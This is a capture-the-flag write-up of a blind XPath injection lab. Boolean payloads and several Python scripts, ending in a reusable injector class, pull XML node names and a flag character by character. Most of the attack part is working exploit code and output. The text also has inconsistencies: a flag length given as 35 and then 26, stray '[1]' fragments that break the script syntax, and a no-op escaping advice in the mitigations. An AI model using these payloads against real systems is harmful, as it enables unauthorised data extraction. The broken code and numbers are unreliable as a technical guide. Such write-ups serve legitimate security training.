# Blind XPath Injection CTF - Complete Writeup

## Challenge Overview
**Challenge Name:** XPath Message Injection  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Target:** http://192.168.0.100:8000/message  

## Vulnerability Description
The application uses user input in an XPath query without proper sanitization. This allows us to inject XPath queries and extract the entire XML database through blind injection techniques.

---

## Reconnaissance

### Initial Testing
First, I tested the `/message` endpoint with normal input:
```
POST /message HTTP/1.1
username=test&msg=hello
```

Then I tried injecting a single quote to test for injection:

```
username=test'&msg=hello
```

The application behaved differently, confirming an injection point exists.

---

## Exploitation Journey

### Step 1: Finding Root Node Name

#### 1.1 Manual - Find Root Node Length
**Payload:**
```
invalid' or string-length(name(/*))=1 and '1'='1
invalid' or string-length(name(/*))=2 and '1'='1
invalid' or string-length(name(/*))=3 and '1'='1
...
invalid' or string-length(name(/*))=8 and '1'='1
```

**Result:** Length = 8 (Message successfully sent!)

**Explanation:**
- `/*[1]` - Selects the first (root) node
- `name()` - Gets the node name
- `string-length()` - Returns the length of the string 
- 
#### 1.2 Manual - Extract Root Node Name Character by Character

Position 1:
```
invalid' or substring(name(/*),1,1)='a' and '1'='1  ❌
invalid' or substring(name(/*),1,1)='b' and '1'='1  ❌
...
invalid' or substring(name(/*),1,1)='a' and '1'='1  ✅
```

Position 2:
```
invalid' or substring(name(/*),2,1)='a' and '1'='1  ❌
invalid' or substring(name(/*),2,1)='c' and '1'='1  ✅
```

Continuing this process: **`accounts`**

---

### Step 2: Finding Child Node Name

#### 2.1 Manual - Find Child Node Length
**Payload:**
```
invalid' or string-length(name(/accounts/*))=7 and '1'='1
```

**Result:** Length = 7 characters ✅

**Explanation:**
- `/accounts/*[1]` - First child node of accounts
- We now know the child element name is 7 characters long

#### 2.2 Manual - Extract Child Node Name
```
invalid' or substring(name(/accounts/*),1,1)='a' and '1'='1  ✅
invalid' or substring(name(/accounts/*),2,1)='c' and '1'='1  ✅
invalid' or substring(name(/accounts/*),3,1)='c' and '1'='1  ✅
invalid' or substring(name(/accounts/*),4,1)='o' and '1'='1  ✅
invalid' or substring(name(/accounts/*),5,1)='u' and '1'='1  ✅
invalid' or substring(name(/accounts/*),6,1)='n' and '1'='1  ✅
invalid' or substring(name(/accounts/*),7,1)='t' and '1'='1  ✅
```

**Result:** `account`

---

### Step 3: Enumerate All Child Elements

#### 3.1 Manual - Count Total Children
**Payload:**
```
invalid' or count(/accounts/*/*)=1 and '1'='1  ❌
invalid' or count(/accounts/*/*)=2 and '1'='1  ❌
invalid' or count(/accounts/*/*)=3 and '1'='1  ❌
invalid' or count(/accounts/*/*)=4 and '1'='1  ✅
```

**Result:** 4 child elements exist

#### 3.2 Semi-Automated - Extract All Child Names

**Script:**
```python
import requests, re

url = "http://192.168.0.100:8000/message"
chars = 'abcdefghijklmnopqrstuvwxyz'

for child_pos in range(1, 5):  # 4 children
    childName = ''
    for i in range(1, 15):  # max length 15
        for c in chars:
            r = requests.post(url, data={
                'username': f"invalid' or substring(name(/accounts/*/*[{child_pos}]),{i},1)='{c}' and '1'='1",[1]
                'msg': 'test'
            })
            if 'Message successfully sent!' in r.text:
                childName += c
                break
        else:
            break
    print(f"Child {child_pos}: {childName}")
```

**Output:**
```
Child 1: username
Child 2: password
Child 3: desc
Child 4: flag
```

**XML Structure Discovered:**
```
<accounts>
    <account>
        <username>...</username>
        <password>...</password>
        <desc>...</desc>
        <flag>...</flag>
    </account>
</accounts>
```

---

### Step 4: Exfiltrating the Flag

#### 4.1 Manual - Find Flag Length
**Payload:**
```
invalid' or string-length(/accounts/*/flag/text())=20 and '1'='1  ❌
invalid' or string-length(/accounts/*/flag/text())=30 and '1'='1  ❌
invalid' or string-length(/accounts/*/flag/text())=35 and '1'='1  ✅
```

**Result:** Flag is 35 characters long

#### 4.2 Automated - Extract Flag

**Final Exploit Script:**

```python
import requests, re

url = "http://192.168.0.100:8000/message"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$'

# Step 1: Find flag length
print("[*] Finding flag length...")
for length in range(1, 50):
    r = requests.post(url, data={
        'username': f"invalid' or string-length(/accounts/*/flag/text())={length} and '1'='1",[1]
        'msg': 'test'
    })
    if 'Message successfully sent!' in r.text:
        print(f"[+] Flag length: {length}")
        break

# Step 2: Extract flag character by character
print("[*] Extracting flag...")
flag = ''
for i in range(1, length+1):
    for c in chars:
        r = requests.post(url, data={
            'username': f"invalid' or substring(/accounts/*/flag/text(),{i},1)='{c}' and '1'='1",[1]
            'msg': 'test'
        })
        if 'Message successfully sent!' in r.text:
            flag += c
            print(f"[+] Position {i}/{length}: {c} -> {flag}")
            break

print(f"\n[✓] Final Flag: {flag}")
```

**Execution:**
```
python exploit.py
```

**Output:**
```
Flag length: 26
Position 1: h -> h  
Position 2: a -> ha 
Position 3: c -> hac
Position 4: k -> hack
Position 5: c -> hackc
Position 6: u -> hackcu
Position 7: b -> hackcub
Position 8: e -> hackcube
Position 9: s -> hackcubes
Position 10: { -> hackcubes{
Position 11: b -> hackcubes{b
Position 12: l -> hackcubes{bl
Position 13: 1 -> hackcubes{bl1
Position 14: n -> hackcubes{bl1n
Position 15: d -> hackcubes{bl1nd
Position 16: X -> hackcubes{bl1ndX
Position 17: P -> hackcubes{bl1ndXP
Position 18: 4 -> hackcubes{bl1ndXP4
Position 19: t -> hackcubes{bl1ndXP4t
Position 20: h -> hackcubes{bl1ndXP4th
Position 21: _ -> hackcubes{bl1ndXP4th_
Position 22: v -> hackcubes{bl1ndXP4th_v
Position 23: 1 -> hackcubes{bl1ndXP4th_v1
Position 24: b -> hackcubes{bl1ndXP4th_v1b
Position 25: z -> hackcubes{bl1ndXP4th_v1bz
Position 26: } -> hackcubes{bl1ndXP4th_v1bz}

Final Flag: hackcubes{bl1ndXP4th_v1bz}
```

---

## Complete Automation Script

```python
import requests
import re


class XPathBlindInjector:
    def __init__(self, url):
        self.url = url
        self.chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$'
        
    def test_payload(self, payload):
        """Test if payload returns true"""
        r = requests.post(self.url, data={'username': payload, 'msg': 'test'})
        return 'Message successfully sent!' in r.text
    
    def find_length(self, xpath_query):
        """Find length of XPath result"""
        for length in range(1, 50):
            payload = f"invalid' or string-length({xpath_query})={length} and '1'='1"
            if self.test_payload(payload):
                return length
        return 0
    
    def extract_string(self, xpath_query, length):
        """Extract string character by character"""
        result = ''
        for i in range(1, length+1):
            for c in self.chars:
                payload = f"invalid' or substring({xpath_query},{i},1)='{c}' and '1'='1"
                if self.test_payload(payload):
                    result += c
                    print(f"[+] Position {i}/{length}: {c} -> {result}")
                    break
        return result
    
    def count_nodes(self, xpath_query):
        """Count number of nodes"""
        for count in range(1, 20):
            payload = f"invalid' or count({xpath_query})={count} and '1'='1"
            if self.test_payload(payload):
                return count
        return 0
    
    def exploit(self):
        print("[*] Starting XPath Blind Injection Exploitation")
        print("=" * 50)
        
        # Step 1: Find root node
        print("\n[*] Step 1: Finding root node name...")
        root_length = self.find_length("name(/*[1])")
        print(f"[+] Root node length: {root_length}")
        root_name = self.extract_string("name(/*[1])", root_length)
        print(f"[✓] Root node: {root_name}\n")
        
        # Step 2: Count children
        print("[*] Step 2: Counting child elements...")
        child_count = self.count_nodes(f"/{root_name}/*[1]/*")
        print(f"[✓] Total children: {child_count}\n")
        
        # Step 3: Extract child names
        print("[*] Step 3: Extracting child element names...")
        children = []
        for pos in range(1, child_count+1):
            child_length = self.find_length(f"name(/{root_name}/*[1]/*[{pos}])")
            child_name = self.extract_string(f"name(/{root_name}/*[1]/*[{pos}])", child_length)
            children.append(child_name)
            print(f"[✓] Child {pos}: {child_name}")
        
        # Step 4: Extract flag
        if 'flag' in children:
            print("\n[*] Step 4: Extracting flag value...")
            flag_length = self.find_length(f"/{root_name}/*[1]/flag/text()")
            print(f"[+] Flag length: {flag_length}")
            flag = self.extract_string(f"/{root_name}/*[1]/flag/text()", flag_length)
            print(f"\n{'='*50}")
            print(f"[✓✓✓] FLAG CAPTURED: {flag}")
            print(f"{'='*50}")
        else:
            print("[!] No flag element found")


# Run exploitation
if __name__ == "__main__":
    injector = XPathBlindInjector("http://192.168.0.100:8000/message")
    injector.exploit()
```

---

## Key Techniques Used

### XPath Functions
| Function          | Purpose           | Example                                                 |
| ----------------- | ----------------- | ------------------------------------------------------- |
| `name()`          | Get element name  | `name(/*[1])` returns "accounts"                        |
| `string-length()` | Get string length | `string-length("flag")` returns 4                       |
| `substring()`     | Extract substring | `substring("flag",1,1)` returns "f"                     |
| `count()`         | Count nodes       | `count(/accounts/*)` returns number of account elements |
| `text()`          | Get text value    | `/accounts/account/flag/text()` returns flag value      |

### XPath Selectors
- `/*[1]` - First root element
- `/accounts/*[1]` - First account element
- `/accounts/*[1]/*[2]` - Second child of first account
- `//flag` - Any flag element at any depth

---

## Lessons Learned

1. **Blind injection requires patience** - Each character needs individual testing
2. **XPath functions are powerful** - `substring()`, `string-length()`, `count()` enable full data extraction 
3. **Automation is essential** - Manual extraction is too slow for production exploits
4. **No commenting in XPath** - Unlike SQL, can't use `--` to comment out rest of query
5. **Boolean-based extraction works** - Even without direct output, can extract data bit by bit
---

## Mitigation

1. **Input validation** - Sanitize all user input
2. **Parameterized queries** - Use precompiled XPath expressions
3. **Encode special characters** - Replace `'` with `'`
4. **Least privilege** - Limit XPath query scope
5. **Use JSON/SQL instead** - Modern databases are more secure than XML queries

---

## References
- OWASP XPath Injection Guide
- Blind XPath Injection Research Papers
- CTF XPath Challenges

**Flag:** `hackcubes{bl1ndXP4th_v1bz}`

---

*Writeup by: Aryan Jaiswal*  
*Date: November 22, 2025*  
*Challenge: XPath Injection Lab*
